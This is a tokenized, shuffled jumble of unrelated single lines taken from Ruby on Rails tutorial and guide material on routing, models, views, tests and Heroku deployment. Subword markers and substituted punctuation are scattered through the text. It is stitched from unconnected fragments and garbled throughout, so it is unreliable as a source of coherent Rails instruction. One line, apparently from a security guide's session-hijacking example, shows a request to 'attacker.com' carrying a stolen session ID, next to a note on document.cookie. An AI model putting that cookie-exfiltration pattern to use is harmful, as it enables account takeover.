▁The ▁next ▁step ▁on ▁both ▁local ▁systems ▁and ▁the ▁cloud ▁IDE ▁is ▁to ▁create ▁the ▁first ▁application ▁using ▁the ▁command ▁in ▁Listing ~\ ref { code : rails _ command } .
▁The ▁next ▁step ▁is ▁to ▁install ▁Ruby .
▁Of ▁course , ▁the ▁views ▁in ▁Listing ~\ ref { code : home _ view _ erb _ title }, ▁Listing ~\ ref { code : help _ view _ erb _ title }, ▁and ▁Listing ~\ ref { code : about _ view _ erb _ title } ▁are ▁ still ▁ filled ▁with ▁all ▁the ▁HTML ▁structure ▁included ▁in ▁the ▁layout , ▁so ▁we ▁have ▁to ▁remove ▁it , ▁leav ing ▁only ▁the ▁ interior ▁contents .
▁If ▁the ▁array ▁contains ▁ items ▁that ▁respond ▁to ▁` id `, ▁however , ▁the ▁symbol ╼` : db ` ▁may ▁be ▁passed ▁as ▁argument ▖
▁What ▁happens ▁is ▁that ▁Rails ▁ puts ▁the ▁string ▁into ▁the ▁ Location ▁header ▁field ▁and ▁send s ▁a ▁ 302 ▁( redirect ) ▁status ▁to ▁the ▁browser ▖
▁create ▁test / mailers / preview s / user _ mailer _ preview ▖ rb
▁# ▁Or ig in al ▁query ▁without ▁` only `
▁Recall ing ▁that ▁the ▁signup ▁page ▁ / signup ▁is ▁route d ▁to ▁the ▁\ k ode { new } ▁action ▁in ▁the ▁Users ▁controller ▁( Listing ~\ ref { code : signup _ route }), ▁our ▁first ▁step ▁is ▁to ▁create ▁the ▁User ▁object ▁required ▁as ▁an ▁argument ▁to ▁\ k ode { form \_ for } .
▁### ▁The ▁` belongs _ to ` ▁Association
▁* ▁` none `
▁A ▁\ k ode { Gemfile } ▁with ▁an ▁explicit ▁version ▁for ▁each ▁Ruby ▁gem .
▁| Rake file | This ▁file ▁ lo cat es ▁and ▁load s ▁task s ▁that ▁can ▁be ▁run ▁from ▁the ▁command ▁line ▖
▁ ActionDispatch :: Session ▖ const _ get ( store ▖ to _ s ▖ camelize ) ▁:
▁A ▁diagram ▁of ▁this ▁hierarchy ▁appears ▁in ▁Figure ~\ ref { fig : static _ pages _ controller _ inheritance } .
▁page ▁for ▁a ▁new ▁session ▁( login )
▁The ▁Microposts ▁controller ▁in ▁schematic ▁form .
▁$("# new _ article ")▖ append ▁ xhr ▖ response T ext
▁\ chapter { Updating , ▁ showing , ▁and ▁ deleting ▁users } ▁% ▁( fold )╼\ label { cha : updating _ showing _ and _ deleting _ users }╼╼
▁``` html + erb
▁An ▁application ▁is ▁the ▁object ▁that ╼ has ▁final ▁say ▁in ▁what ▁go es ▁on ▁in ▁its ▁environment ▖
▁Here ▁the ▁table ▁name ▁is ▁plural ▁(\ k ode { users }) ▁even ▁though ▁the ▁model ▁name ▁is ▁ singular ▁( User ), ▁which ▁reflect s ▁a ▁ l ing u ist ic ▁convention ▁followed ▁by ▁Rails : ▁a ▁model ▁represent s ▁a ▁single ▁user , ▁whereas ▁a ▁database ▁table ▁consist s ▁of ▁many ▁users .
▁This ▁will ▁create ▁a ▁` Product ` ▁model , ▁map ped ▁to ▁a ▁` products ` ▁table ▁at ▁the ╼ database ▖
▁This ▁reduce s ▁the ▁brittle ness ▁of ▁your ▁view ▁and ▁make s ▁your ▁code ▁easier ▁to ▁understand ▖
▁The ▁computer ▁doesn ' t ▁care , ▁of ▁course , ▁but ▁ human s ▁do , ▁so ▁it ▁is ▁important ▁to ▁keep ▁the ▁code ▁base ▁clean ▁by ▁refactoring ▁f r equ ent ly .
▁INFO : ▁The ▁ safety ▁bit ▁is ▁ lo st ▁always , ▁no ▁matter ▁whether ▁the ▁ transform ation ▁actually ▁changed ▁something .
▁A ▁test ▁for ▁the ▁status ▁feed ▖
▁( In ▁this ▁case , ▁it ▁turn s ▁out ▁we ▁can ▁omit ▁the ▁other ▁command - line ▁arguments .
▁### ▁ Overriding ▁Model s ▁and ▁Controller s
▁With ▁the ▁\ k ode { authenticated ?}\ ▁method ▁as ▁in ▁Listing ~\ ref { code : generalized _ authenticated _ p }, ▁we ' re ▁now ▁ready ▁to ▁write ▁an ▁\ k ode { edit } ▁action ▁that ▁ authenticate s ▁the ▁user ▁corresponding ▁to ▁the ▁email ▁address ▁in ▁the ▁\ k ode { params } ▁hash .
▁GET ▁ http :// www ▖ attacker ▖ com / _ app _ session = 8 36 c 1 c 2 5278 e 5 b 32 1 d 6 be a 4 f 19 c b 57 e 2
▁belongs _ to ▁: supplier
▁CSS ▁for ▁the ▁users ▁index .
▁En sure ▁the ▁change set s ▁you ▁introduce d ▁are ▁included ▖
▁In ▁Listing ~\ ref { code : following _ tests }, ▁note ▁that ▁we ▁include ▁the ▁ assert ion
▁in ▁Listing ~\ ref { code : micropost _ model _ image _ validation } .
▁### ▁` i nclusion `
▁To ▁accomplish ▁that ▁you ▁could ▁wrap ▁` ActionController :: TestCase # process ` ▁this ▁way ▁in ▁` test / test _ helper ▖ rb `:
▁gem ▁' coffee - rails ', ▁' ~ > ▁3▖2 ▖ 2 '
▁Then ▁we ▁just ▁need ▁to ▁add ▁an ▁\ k ode { index } ▁action ▁and ▁include ▁it ▁in ▁the ▁list ▁of ▁actions ▁ protected ▁by ▁the ▁\ k ode { logged \_ in \_ user } ▁before ▁filter ▁( Listing ~\ ref { code : logged _ in _ user _ index }) .
▁<%= ▁render ▁' form ' ▁%>
▁This ▁changes ▁the ▁`` Follow '' ▁button ▁to ▁`` Unfollow '' ▁and ▁ increment s ▁ Hobbes ' s ▁`` followers '' ▁count ▁by ▁one ▁( Figure ~\ ref { fig : page _ flow _ other _ profile _ unfollow _ button _ mockup }) .
▁In ╼ Active ▁Record , ▁objects ▁c ar ry ▁both ▁ persistent ▁data ▁and ▁behavior ▁which ╼ o p er ate s ▁on ▁that ▁data ▖
▁If ▁you ▁prefer , ▁you ▁can ▁use ▁a ▁symbol ▁instead ▁of ▁a ▁string ▁to ▁specify ▁the ▁action ▁to ▁render :
▁Because ▁we ▁wrote ▁the ▁application ▁code ▁before ▁the ▁integration ▁test , ▁the ▁test ▁suite ▁should ▁be ▁\ passing :
▁As ▁in ▁that ▁case , ▁Rails ▁calculat es ▁the ▁count ▁directly ▁in ▁the ▁database ▁for ▁e f fi ci en c y .
▁This ▁is ▁because ▁the ▁first ╼ two ▁migrations ▁were ▁copie d ▁over ▁the ▁first ▁time ▁this ▁command ▁was ▁run .
▁#### ▁number _ to _ percentage
▁You ▁m ight ▁have ▁notice d ▁that ▁the ▁standard ▁Rails ▁application ▁structure ▁( Figure ~\ ref { fig : directory _ structure _ rails }) ▁has ▁an ▁application ▁directory ▁called ▁\ k ode { app / } ▁with ▁three ▁subdirectories : ▁\ k ode { models }, ▁\ k ode { views }, ▁and ▁\ k ode { controllers } .
▁We ▁could ▁pull ▁the ▁function ▁definition ▁out ▁of ▁the ▁click ▁handle r ,╼ and ▁turn ▁it ▁into ▁CoffeeScript :
▁#### ▁ label
▁A part ▁from ▁the ▁address ▁of ▁the ▁Heroku ▁app , ▁the ▁result ▁should ▁be ▁the ▁same ▁as ▁in ▁Figure ~\ ref { fig : heroku _ app } .
▁Now ▁that ▁the ▁\ k ode { correct \_ user } ▁before ▁filter ▁defines ▁\ k ode {@ user }, ▁we ▁can ▁omit ▁it ▁from ▁both ▁actions .
▁The ▁key ▁lines ▁here ▁are ▁actually ▁CSS ▁comments , ▁but ▁they ▁are ▁used ▁by ▁Sprockets ▁to ▁include ▁the ▁proper ▁files :
▁update ▁user ▁with ▁id ▁\ text tt {1}
▁# ▁=> ▁#< Client ▁id : ▁ 22 1, ▁first _ name : ▁" Russ el ">
▁( 2▖ ▖ 3 )▖ include ?( Math :: E ) ▁# ▁=> ▁true
▁A ▁template ▁for ▁testing ▁image ▁upload .
▁We ' ll ▁learn ▁in ▁Section ~\ ref { sec : slightly _ dynamic _ pages } ▁what ▁the ▁\ k ode { ▖ erb } ▁part ▁means ; ▁from ▁the ▁\ k ode { ▖ html } ▁part ▁you ▁ probably ▁won ' t ▁be ▁surpris ed ▁that ▁it ▁basic ally ▁look s ▁like ▁HTML ▁( Listing ~\ ref { code : raw _ home _ view }) .
▁As ▁we ▁saw ▁in ▁Section ~\ ref { sec : requiring _ logged _ in _ users }, ▁it ' s ▁easy ▁to ▁have ▁a ▁test ▁suite ▁that ▁ mis s es ▁an ▁essential ▁security ▁f la w , ▁so ▁we ' ll ▁proceed ▁using ▁test - driven ▁development ▁to ▁be ▁sure ▁our ▁code ▁implement s ▁the ▁security ▁model ▁correctly .
▁@ comment ▖ destroy
▁If ▁it ▁cannot ▁find ▁the ▁view ▁there , ▁it ▁will ▁check ▁in ╼ the ▁` app / views ` ▁directories ▁of ▁all ▁engines ▁that ▁have ▁this ▁directory .
▁class _ name ▁= ▁class _ name ▖ singularize ▁if ▁collection ?
▁By ▁the ▁way , ▁if ▁you ▁have ▁deploy ed ▁your ▁sample ▁app ▁to ▁Heroku , ▁you ▁can ▁see ▁its ▁environment ▁using ▁\ text tt { heroku ▁run ▁console } :
▁( I ' ve ▁omitted ▁the ▁route r ▁from ▁Figure ~\ ref { fig : MVC } ▁for ▁simplicity , ▁but ▁we ' ll ▁discuss ▁the ▁route r ▁in ▁more ▁detail ▁starting ▁in ▁Section ~\ ref { sec : mvc _ in _ action } ▖)
▁As ▁seen ▁in ▁Figure ~\ ref { fig : micropost _ length _ error _ rails _3} , ▁Rails ▁render s ▁\ emph { error ▁messages } ▁indicat ing ▁that ▁the ▁micropost ' s ▁content ▁is ▁too ▁long .
▁< em >< b > emph ▁& amp ; ▁ bo ld </ b ></ em >
▁ Adding ▁the ▁follow ▁form ▁and ▁ follower ▁ stats ▁to ▁the ▁user ▁profile ▁page .
▁The ▁profile ▁page ▁after ▁a ▁successful ▁activation .
▁You ▁m ight ▁want ▁to ▁read ▁up ▁on ▁\ href { http :// www ▖ google ▖ com / search ? q = state + ma ch in es + in + rails } { state ▁machine s ▁in ▁Rails } ▁to ▁help ▁you ▁with ▁the ▁in active / active ▁ tr an s it ion .
▁Creat ing ▁the ▁toy ▁app ▁repository ▁at ▁Bitbucket .
▁def ▁a _ method _ used _ for _ validation _ p urpose s
▁When ▁the ▁file ▁contents ▁change , ▁the ▁filename ▁is ▁also ╼ change d ▖
▁There for e ,╼ it ' s ▁recommended ▁not ▁to ▁disable ▁this ▁option ▁unless ▁you ▁have ▁a ▁ strong ▁reason ▁for ╼ do ing ▁so .
▁There ▁is ▁one ▁break ▁with ▁ past ▁convention ▁worth ▁noting : ▁the ▁interface ▁to ▁the ▁Microposts ▁resource ▁will ▁run ▁principal ly ▁through ▁the ▁Users ▁and ▁StaticPages ▁controllers , ▁so ▁we ▁won ' t ▁need ▁actions ▁like ▁\ k ode { new } ▁or ▁\ k ode { edit } ▁in ▁the ▁Microposts ▁controller ; ▁we ' ll ▁only ▁need ▁\ k ode { create } ▁and ▁\ k ode { destroy } .
▁At ▁this ▁stage , ▁we ▁need ▁to ▁set ▁up ▁SSL ▁on ▁the ▁remote ▁server .
▁**` ActionDispatch :: Cookie s ` **
▁class ▁S and box E mail In ter ce p to r
▁With ▁the ▁production ▁ webserver ▁configuration ▁complete d , ▁we ' re ▁ready ▁to ▁commit ▁and ▁deploy
▁The ▁` collection ▖ clear ` ▁method ▁remove s ▁every ▁object ▁from ▁the ▁collection ▖
▁As ▁required ▁by ▁the ▁virtual ▁nature ▁of ▁the ▁activation ▁token , ▁we ' ve ▁added ▁a ▁second ▁\ k ode { attr \_ accessor } ▁to ▁our ▁model .
▁is ▁a ▁ sensitive ▁test ▁for ▁ al most ▁everything ▁related ▁to ▁a ▁user ' s ▁profile ▁page .
▁The ▁result ▁appears ▁in ▁Listing ~\ ref { code : valid _ user _ test }
▁If ▁you ▁want ▁to ▁be ▁sure ▁that ▁an ▁association ▁is ▁ abs ent , ▁you ' ll ▁need ▁to ▁test ╼ w hether ▁the ▁ associated ▁object ▁itself ▁is ▁ abs ent , ▁and ▁not ▁the ▁foreign ▁key ▁used ╼ to ▁map ▁the ▁association .
▁( Note ▁that , ▁if ▁you ▁want ▁G row l ▁ notification s , ▁you ▁will ▁have ▁to ▁p ur cha se ▁\ href { http :// g row l ▖ info / download s } { G row l }, ▁which ▁is ▁available ▁in ▁the ▁App le ▁App ▁ Store ▁for ▁a ▁no m in al ▁charg e ▖)
▁Article ▖ where (' id ▁> ▁10 ')▖ limit ( 20 )▖ order (' id ▁as c ')▖ unscope (: order )
▁A lthough ▁we ▁started ▁ deploying ▁our ▁application ▁in ▁Chapter ~\ ref { cha : static _ pages }, ▁this ▁is ▁the ▁first ▁time ▁it ▁will ▁actually ▁\ emph { do } ▁something , ▁so ▁we ' ll ▁take ▁this ▁opportunit y ▁to ▁make ▁the ▁deployment ▁ professional - grade .
▁To ▁add ▁conditions ▁to ▁a ▁` find _ each ` ▁operation ▁you ▁can ▁ chain ▁other ▁Active ▁Record ▁methods ▁such ▁as ▁` where `:
▁=> ▁6
▁=> ▁" 1, ▁2, ▁3 , ▁4 "
▁For ▁example , ▁I ▁once ▁ha d ▁a ▁test ▁suite ▁that ▁was ▁\ passing \ ▁even ▁after ▁accidental ly ▁ deleting ▁the ▁main ▁\ k ode { log \_ in } ▁method ▁in ▁the ▁Sessions ▁helper .
▁ prev _ year ▁( last _ year )
▁before _ add : ▁ [: check _ credit _ limit , ▁: calculate _ ship p ing _ cha r ge s ]
▁A po log ies ▁in ▁ advance ▁for ▁switch ing ▁ha ph a z ar d ly ▁between ▁\ emph { function } ▁and ▁\ emph { method } ▁throughout ▁this ▁chapter ; ▁in ▁Ruby , ▁they ' re ▁the ▁same ▁thing : ▁all ▁methods ▁are ▁function s , ▁and ▁all ▁function s ▁are ▁methods , ▁because ▁everything ▁is ▁an ▁object .
▁S an it ize s ▁a ▁block ▁of ▁CSS ▁code .
▁with _ options ▁if : ▁: is _ admin ?
▁NOTE : ▁You ▁can ' t ▁use ▁`: namespace ` ▁or ▁`: module ` ▁with ▁a ▁`: controller ` ▁path ▁segment ▖
▁You ▁can ▁use ▁` redirect _ to ` ▁with ▁any ▁arguments ▁that ▁you ▁could ▁use ▁with ▁` link _ to ` ▁or ▁` url _ for ` ▖
▁Or dinarily , ▁you ▁should ▁make ▁small er , ▁more ▁f r equ ent ▁commit s , ▁but ▁for ▁the ▁purposes ▁of ▁this ▁chapter ▁a ▁single ▁big ▁commit ▁at ▁the ▁end ▁is ▁fine .
▁If ▁you ▁simply ▁want ▁to ▁check ▁for ▁the ▁exist ence ▁of ▁the ▁object ▁there ' s ▁a ▁method ▁called ▁` exists ?
▁We ▁can ▁express ▁the ▁expect ation ▁that ▁the ▁microposts ▁don ' t ▁appear ▁in ▁the ▁database ▁as ▁follows :
▁client ▁= ▁Client ▖ first
▁#### ▁ Methods ▁Add ed ▁by ▁` has _ many `
▁On ▁a ▁local ▁server , ▁point ▁your ▁browser ▁at ▁the ▁address ▁\ href { http :// localhost :3000/ } { http :// localhost :3000/ } ; ▁on ▁the ▁cloud ▁IDE , ▁go ▁to ▁S ha re ▁and ▁click ▁on ▁the ▁Application ▁address ▁to ▁open ▁it ▁( Figure ~\ ref { fig : s ha re _ workspace }) .
▁P lease ▁see ▁the ▁ benchmark / ips ▁[ README ]( https :// github ▖ com / e v an ph x / benchmark - ips / blo b / master / README ▖ md ) ▁for ▁more ▁information .
▁To ▁get ▁the ▁test ▁suite ▁to ▁green , ▁we ▁need ▁to ▁add ▁a ▁\ emph { step } ▁file ▁that ▁map s ▁the ▁plain - text ▁lines ▁to ▁Ruby ▁code .
▁A ▁form ▁for ▁following ▁a ▁user .
▁Because ▁both ▁hash ▁syntax es ▁are ▁ still ▁in ▁common ▁use , ▁it ' s ▁essential ▁to ▁be ▁able ▁to ▁recognize ▁both ▁of ▁them .
▁The ▁document ▖ cookie ▁property ▁hold s ▁the ▁cookie ▁of ▁the ▁ origin ating ▁web ▁server ▖
▁Rails ▁provides ▁a ▁domain - specific ▁language ▁for ▁ man a g ing ▁a ▁database ▁ schema ▁called ╼ migrations ▖
▁A lthough ▁at ▁first ▁it ▁may ▁seem ▁mysterious , ▁\ emph { or ▁equal s } ▁is ▁easy ▁to ▁understand ▁by ▁analogy .
▁On ce ▁you ' ve ▁created ▁and ▁configured ▁your ▁S 3 ▁account , ▁you ▁should ▁create ▁and ▁fill ▁the ▁ CarrierWave ▁configuration ▁file ▁as ▁show n ▁in ▁Listing ~\ ref { code : carrier _ w a ve _ configuration } .
▁-> ▁Inde x ▁S can ▁using ▁users _ p key ▁on ▁users ▁( cost = 0 ▖ 00 ▖ ▖ 8 ▖ 27 ▁rows = 1 ▁ width = 4 )
▁belongs _ to ▁: customer , ▁class _ name : ▁" P at r on ",
▁TIP : ▁You ▁should ▁ probably ▁be ▁using ▁the ▁` head ` ▁method , ▁discuss ed ▁later ▁in ▁this ▁guide , ▁instead ▁of ▁` render ▁: not h ing ` ▖
▁# ▁=> ▁[ [ - 5 ] , ▁[ - 3 , ▁- 2, ▁- 1 ] , ▁[1, ▁2, ▁3] , ▁[ 5 ]]
▁This ╼ me an s ▁that ▁it ▁will ▁make ▁sure ▁that ▁all ▁ locales ▁passed ▁to ▁it ▁must ▁be ▁declare d ▁in ╼ the ▁` available _ locales ` ▁list .
▁( end )╼╼ ▁\ subsection { Follow ers } ▁% ▁( fold )╼ ▁\ label { sec : followers }╼╼
▁ Error ▁messages ▁for ▁a ▁failed ▁micropost ▁creation ▖ ~\ href { http :// railstutorial ▖ org / images / figures / micropost _ length _ error _ rails _ 3- full ▖ png }{( full ▁size )}
▁require ▁ :: File ▖ expand _ path (' ▖ ▖ / config / environment ', ▁ _ _ FIL E _ _ )
▁* ▁` ActiveSupport :: D eprecation ▖ silence ` ▁take s ▁a ▁block ▁in ▁which ▁all ▁d eprecation ▁ warning s ▁are ▁ silence d .
▁NOTE : ▁The ▁` namespace ` ▁scope ▁will ▁automatically ▁add ▁`: as ` ▁as ▁well ▁as ▁`: module ` ▁and ▁`: path ` ▁prefix es .
▁<%= ▁render (@ products ) ▁|| ▁" The re ▁are ▁no ▁ products ▁available ▖ "
▁A ▁first , ▁slightly ▁in correct , ▁attempt ▁appears ▁in ▁Listing ~\ ref { code : failed _ login _ attempt } .
▁get ▁' c la sh ing / : id ' ▁=> ▁' test # example ', ▁as : ▁: example
▁It ' s ▁entire ly ▁possible ▁that ▁the ▁feedback ▁you ▁get ▁will ▁suggest ▁changes ▖
▁Testing ▁that ▁the ▁\ k ode { edit } ▁and ▁\ k ode { update } ▁actions ▁are ▁ protected .
▁The ▁first ▁step ▁is ▁to ▁\ href { http :// signup ▖ heroku ▖ com /}{ sign ▁up ▁for ▁Heroku } .
▁In ▁the ▁context ▁of ▁web ▁applications , ▁\ emph { authentication } ▁allows ▁us ▁to ▁identify ▁users ▁of ▁our ▁site , ▁and ▁\ emph { authorization } ▁let s ▁us ▁control ▁what ▁they ▁can ▁do .
▁### ▁ Options ▁ Extra c tion
▁Client ▖ order (: created _ at )
▁Having ▁show n ▁how ▁to ▁create , ▁show , ▁and ▁edit ▁users , ▁we ▁come ▁finally ▁to ▁destroying ▁them ▁( Figure ~\ ref { fig : demo _ destroy _ user }) .
▁> > ▁Rails ▖ env ▖ production ?
▁What ever ▁the ▁name , ▁you ▁must ▁manually ▁generate ▁the ▁join ▁table ▁with ▁an ▁appropriate ▁migration ▖
▁* ▁` config ▖ action _ view ▖ raise _ on _ missing _ tr an s l ation s ` ▁determine s ▁whether ▁an ▁error ▁should ▁be ▁raised ▁for ▁missing ▁ tr an s l ation s
▁where ▁\ k ode { cookies ▖ signed [: user \_ id ]} ▁automatically ▁ de crypt s ▁the ▁user ▁id ▁\ line break ▁cookie .
▁image _ tag (" rails ▖ png ") ▁# ▁=> ▁< img ▁src =" http :// assets ▖ example ▖ com / images / rails ▖ png " ▁ alt =" Rails " ▁/>
▁in ▁Listing ~\ ref { code : root _ route } .
▁With ▁the ▁\ k ode { log \_ in } ▁method ▁defined ▁in ▁Listing ~\ ref { code : log _ in _ function }, ▁we ' re ▁now ▁ready ▁to ▁complete ▁the ▁session ▁\ k ode { create } ▁action ▁by ▁logging ▁the ▁user ▁in ▁and ▁redirect ing ▁to ▁the ▁user ' s ▁profile ▁page .
▁One ▁final ▁thing ▁is ▁that ▁the ▁` articles ` ▁resource ▁for ▁this ▁engine ▁should ▁be ▁the ▁root ╼ of ▁the ▁engine ▖
▁You ▁can ▁use ▁the ▁[ Pro t ec ted ▁Attributes ▁gem ]( https :// github ▖ com / rails / protected _ attributes ) ▁for ▁a ▁ s m oo th ▁upgrade ▁path .
▁( In ▁fact , ▁as ▁we ▁saw ▁in ▁Section ~\ ref { sec : demo _ users _ resource } ▁and ▁Section ~\ ref { sec : microposts _ resource }, ▁\ k ode { rails ▁generate } ▁can ▁make ▁automatic ▁edit s ▁to ▁the ▁\ k ode { routes ▖ rb } ▁file , ▁which ▁we ▁also ▁want ▁to ▁undo ▁automatically ▖)
▁ Adding ▁presence ▁validations ▁to ▁the ▁User ▁model .
▁ Connection : ▁close
▁Fin ally , ▁we ▁commit ▁the ▁changes :
▁U p on ▁ success ive ▁ invocation s ▁of ▁the ▁\ k ode { Factory G ir l } ▁method ,
▁d ▁= ▁Date ▖ current
▁The ▁` method : ▁: patch ` ▁option ▁tell s ▁Rails ▁that ▁we ▁want ▁this ▁form ▁to ▁be ▁submitted ╼ via ▁the ▁` PATCH ` ▁HTTP ▁method ▁which ▁is ▁the ▁HTTP ▁method ▁you ' re ▁expected ▁to ▁use ▁to ╼ ** update ** ▁resources ▁according ▁to ▁the ▁REST ▁protocol .
▁| ▁GET ▁| ▁ / photos / : id ▁| ▁images # show ▁| ▁ photo _ path (: id ) ▁|
▁stylesheet _ link _ tag ▁" application " ▁# ▁=> ▁< link ▁ href ="/ assets / application ▖ css " ▁ media =" screen " ▁ rel =" stylesheet " ▁/>
▁@ article ▖ destroy
▁( The ▁call ▁to ▁\ emph { to \_ s } ▁is ▁to ▁make ▁sure ▁we ▁can ▁handle ▁\ k ode { nil } ▁token s , ▁which ▁should n ' t ▁happen ▁in ▁browsers ▁but ▁some times ▁happens ▁in ▁tests ▖)
▁After ▁the ▁ div , ▁we ▁ en counter ▁some ▁ embedded ▁Ruby :
▁* ▁ MySQL : ▁[ EXPLAIN ▁Ou t put ▁Format ]( http :// dev ▖ mysql ▖ com / doc / ref man / 5 ▖ 6 / en / explain - out put ▖ html )
▁COM ", ▁" THE _ U S - ER @ foo ▖ bar ▖ org ", ▁" first ▖ last @ foo ▖ jp "]
▁</ ul >
▁Other ▁Resource s
▁By ▁default , ▁ inline ▁rendering ▁uses ▁ ERB ▖
▁Active ▁Support ▁is ▁the ▁Ruby ▁on ▁Rails ▁ com p on ent ▁responsib le ▁for ▁providing ▁Ruby ▁language ▁extensions , ▁ u til it ies , ▁and ▁other ▁ tr an s v ers al ▁ stuff .
▁If ▁you ▁have n ' t ▁used ▁I R C ▁before , ▁I ▁suggest ▁you ▁start ▁by ▁search ing ▁the ▁web ▁for ▁`` irc ▁client ▁< your ▁platform > '' .
▁ Default ▁is ▁" , ▁" .
▁The ▁\ k ode { id } ▁attribute ▁here ▁is ▁just ▁an ▁ integer ▁( i ▖ e ▖ , ▁\ k ode { self ▖ id }, ▁the ▁unique ▁ ID ▁of ▁the ▁user ), ▁so ▁there ▁is ▁no ▁ danger ▁of ▁SQL ▁injection ▁in ▁this ▁case , ▁but ▁\ emph { al way s } ▁es c a p ing ▁variables ▁ inject ed ▁into ▁SQL ▁statement s ▁is ▁a ▁good ▁ha bit ▁to ▁c ul t i v ate .
▁A v o id ▁using ▁any ▁ print ing ▁methods ▁like ▁` puts ` ▁or ▁` p ` ▁for ▁that ▁purpose .
▁This ▁help s ▁prevent ▁conflicts ▁with ▁any ▁other ▁engine ▁or ▁application ▁that ▁may ▁have ╼ an ▁article ▁resource ▁as ▁well .
▁As ▁we ▁saw ▁brief ly ▁before ▁in ▁the ▁Chapter ~\ ref { cha : a _ demo _ app } ▁ exercises , ▁the ▁way ▁to ▁validate ▁the ▁presence ▁of ▁the ▁name ▁attribute ▁is ▁to ▁use ▁the ▁\ k ode { validates } ▁method ▁with ▁argument ▁\ k ode { presence : ▁true }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : validates _ presence _ of _ name } .
▁This ▁uses ▁the ▁line
▁To ▁start ▁writing ▁the ▁code ▁for ▁\ k ode { current \_ user }, ▁note ▁that ▁the ▁line
▁The ▁\ k ode { log \_ in } ▁method ▁is ▁available ▁in ▁the ▁Sessions ▁controller ▁because ▁of ▁the ▁module ▁inclusion ▁in ▁Listing ~\ ref { code : sessions _ helper _ include } .
▁The ▁method ▁` multiline ?` ▁say s ▁whether ▁a ▁ regex p ▁has ▁the ▁` / m ` ▁flag ▁set , ▁that ▁is , ▁whether ▁the ▁do t ▁matches ▁new lines .
▁They ▁are ▁database ▁a g no s tic , ▁cannot ▁be ▁by pass ed ▁by ▁end ▁users , ▁and ▁are ╼ con ve n i ent ▁to ▁test ▁and ▁maintain ▖
▁in ▁Listing ~\ ref { code : micropost _ belongs _ to _ user _ spec } .
▁ / microposts /1/ edit
▁The ╼ singleton s ▁` true ` ▁and ▁` false ` ▁need ▁ fixed - width ▁f on t ▖
▁* ▁` initialize _ dependency _ mechanism ` ▁If ▁` config ▖ cache _ classes ` ▁is ▁true , ▁configure s ▁` ActiveSupport :: Dependencies ▖ mechanism ` ▁to ▁` require ` ▁ dependencies ▁rather ▁than ▁` load ` ▁them .
▁You ' ve ▁just ▁generated ▁your ▁first ▁engine ' s ▁first ╼ function s .
▁In ▁fact , ▁in ▁the ▁ Book sController ▁class , ▁inside ▁of ▁the ▁update ▁action ▁where ▁we ▁want ▁to ▁render ▁the ▁edit ▁template ▁if ▁the ▁book ▁does ▁not ▁update ▁successfully , ▁all ▁of ▁the ▁following ▁render ▁calls ▁would ▁all ▁render ▁the ▁` edit ▖ html ▖ erb ` ▁template ▁in ▁the ▁` views / books ` ▁directory :
▁It ▁look s ▁for ╼ one ▁here ▁because ▁the ▁` Article sController ` ▁inherit s ▁from ▁` Application Controller ` .
▁( We ' ll ▁make ▁the ▁last ▁one ▁in ▁Chapter ~\ ref { cha : log _ in _ log _ out } ▖)
▁hidden _ field (: user , ▁: token )
▁: pre m i um _ video job s
▁This ▁helper ▁generates ▁the ▁HTML ▁for ▁forms , ▁providing ▁a ▁method ▁for ▁each ▁sort ▁of ▁input ▁( e ▖ g ▖ , ▁text , ▁password , ▁select , ▁and ▁so ▁on )▖
▁Such ▁function s ▁are ▁called ▁\ emph { helpers } ; ▁to ▁see ▁how ▁to ▁make ▁a ▁custom ▁helper , ▁let ' s ▁start ▁by ▁examining ▁the ▁title ▁line ▁from ▁Listing ~\ ref { code : application _ layout _ redux } :
▁The ▁\ k ode { UsersController } ▁class , ▁highlight ing ▁inheritance .
▁| config ▖ ru | Rack ▁configuration ▁for ▁Rack ▁base d ▁server s ▁used ▁to ▁start ▁the ▁application .
▁class ▁To p ic ▁< ▁ActiveRecord :: Base
▁There ' s ▁also ▁the ▁ bang ▁variant ▁` transform _ keys !` ▁that ▁applies ▁the ▁block ▁operations ▁to ▁keys ▁in ▁the ▁very ▁receiver .
▁Start ing ▁in ▁Rails ▁3▖1 , ▁and ▁con t in u ing ▁in ▁Rails ~ 4 , ▁there ▁are ▁\ emph { th re e } ▁can on ical ▁directories ▁for ▁static ▁assets , ▁each ▁with ▁its ▁own ▁purpose :
▁( This ▁uses ▁the ▁ interpolate d ▁\ k ode { inspect } ▁method ▁mentioned ▁in ▁Section ~\ ref { sec : hashes _ and _ symbols } ▖)
▁on ▁general ▁principle s ▁of ▁web ▁development ▁( ra the r ▁than ▁on ▁Rails ▁specific all
▁ Given ▁a ▁path ▁name ▁` is _ missing ?` ▁tests ▁whether ▁the ▁exception ▁was ▁raised ▁due ▁to ▁that ▁particular ▁file ▁( except ▁p erhaps ▁for ▁the ▁" ▖ rb " ▁extension ) .
▁class ▁G u est s C le an up J ob ▁< ▁ ActiveJob :: Base
▁#### # ▁` collection << ( object , ▁ ▖▖▖)
▁$ ▁bundle ▁exec ▁rake ▁test ╼ $ ▁git ▁push ▁ heroku
▁--------- -
▁So ▁in ▁this ▁case , ▁Rails ▁will ▁render ▁the ▁` app / views / books / index ▖ html ▖ erb ` ▁file .
▁ Adding ▁authentication ▁to ▁the ▁Microposts ▁controller ▁actions .
▁There ▁are ▁a ▁few ▁issues ▁when ▁upgrading ▁from ▁Rails ▁ 3▖0 ▁or ▁Rails ▁2▖ x ▖
▁ W h y ▁not ▁just ▁use ▁an ▁off - the - sh el f ▁solution ▁instead ▁of ▁roll ing ▁our ▁own ?
▁ Destroy ing ▁a ▁user ▖ ~\ href { http :// railstutorial ▖ org / images / figures / demo _ destroy _ user _ rails _ 3- full ▖ png }{( full ▁size )}
▁Un like ▁the ▁other ▁attributes ▁we ' ve ▁seen ▁so ▁far , ▁the ▁password ▁attributes ▁will ▁be ▁\ emph { v ir t u al } --- the y ▁will ▁only ▁exist ▁te mp or ar ily ▁in ▁memory , ▁and ▁will ▁not ▁be ▁persist ed ▁to ▁the ▁database .
▁render ▁template : ▁" products / show "
▁ conflict ▁config / application ▖ rb
▁( Writ ing ▁a ▁test ▁for ▁email ▁downcas ing ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : modeling _ users _ exercises })▖)
▁# ▁< rank > 2 </ rank >
▁boolean ? ▁?
▁#### # ▁ Options ▁for ▁` find _ in _ batches `
▁The ▁most ▁light we ight ▁way ▁to ▁get ▁` blank ?` ▁is ▁to ▁c her ry - pick ▁the ▁file ▁that ▁defines ▁it .
▁=> ▁ { : success =>" It ▁work ed !" , ▁error : ▁" It ▁failed ▖ "}
